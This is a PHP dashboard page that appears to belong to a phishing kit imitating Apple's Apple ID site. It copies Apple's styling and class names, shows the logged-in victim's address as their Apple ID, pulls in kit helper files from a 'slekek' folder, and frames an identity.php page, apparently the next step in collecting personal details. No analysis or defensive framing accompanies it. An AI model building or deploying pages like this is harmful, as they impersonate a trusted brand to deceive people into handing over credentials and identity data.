<?php
require '../slekek/func.php';
if ($_SESSION['loggedin'] == false) {
    header("Location:../");
}
require "../slekek/acc.php";
require "../slekek/enc.php";



?>
<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
<title><?php echo $_LANG['DASHBD'];?></title>
<link href="../signin/files/img/favicon.ico" rel="shortcut icon" type="image/x-icon">
<link href="../signin/files/css/First.css" media="all" rel="stylesheet" type="text/css">
<link href="../signin/files/css/Second.css" rel="stylesheet" type="text/css">
<link href="../signin/files/css/Fonts.css" rel="stylesheet" type="text/css">
<link href="../signin/files/css/verify.css" rel="stylesheet" type="text/css">
<link href="../signin/files/css/error-tips.css" rel="stylesheet" type="text/css">
<?php
require "../slekek/lange.php";
?>
</head>
<body id="pagecontent">
<div id="content">
<div class="bdd45">
<nav id="xdsfv54" class="js no-touch svg no-ie7 no-ie8">
<div class="HeaderObjHolder">
<ul class="MobHeader">
<li class="HeaderObj MobMenIconH">
<label class="MobMenHol"> 
<span class="MobMenIcon MobMenIcon-top">
<span class="MobMenIcon-crust MobMenIcon-crust-top"></span> </span> <span class="MobMenIcon MobMenIcon-bottom">
<span class="MobMenIcon-crust MobMenIcon-crust-bottom"></span> </span>
</label>
</li>
<li class="HeaderObj">
<a class="Item1" href="#" style="display: inline-block;margin-left:50%;margin-top:11px" id="ac-gn-firstfocus-small"> <span class="ac-gn-link-text">&nbsp;</span> </a>
<a class="Item10" style="display: inline-block;float:right;margin-top:11px" href="#"> <span class="ac-gn-link-text">&nbsp;</span> <span class="ac-gn-bag-badge"></span> </a> <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span> 
</li>
</ul>

</div>
</nav>
<div id="flow">
<div class="flow-body signin clearfix" role="main">
<div class="persona-splash no-photo clearfix">
    <div class="persona-bg"></div>
    <div class="container">
        <div class="splash-section">
            <div class=" person-wrapper">
                <div>
                    <div class="row">
                        <div class="col-sm-9 appleid-col">
                            <div class="flex-container">
                                <h1 class="not-mobile appleid-user">
                                    <span class="first_name"><?php echo $_LANG['DASHBD'];?></span>
                                    <small class="SessionUser"><?php echo $_LANG['URAPPL'];?> <strong><?php echo $_SESSION['user'];?></strong> </small>
                                </h1>
                            </div>
                        </div>
                        <div class="not-mobile col-sm-3">
                            <div class="flex-container-signout">
                                <div class="signout pull-right">
                                    <a href="logout.php?<?php echo md5(date('Hls')) ?>"><button class="btn btn-link"><?php echo $_LANG['SIGNOUT'];?></button></a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<div class="container">
<div class="flex home-content">
	<center>
		<iframe width="800px" height="600px" src="my/identity.php" scrolling="no" frameborder="0"></iframe>
	</center>
</div>
</div>
</div>
</div>
</div>
</div>
</body>
</html>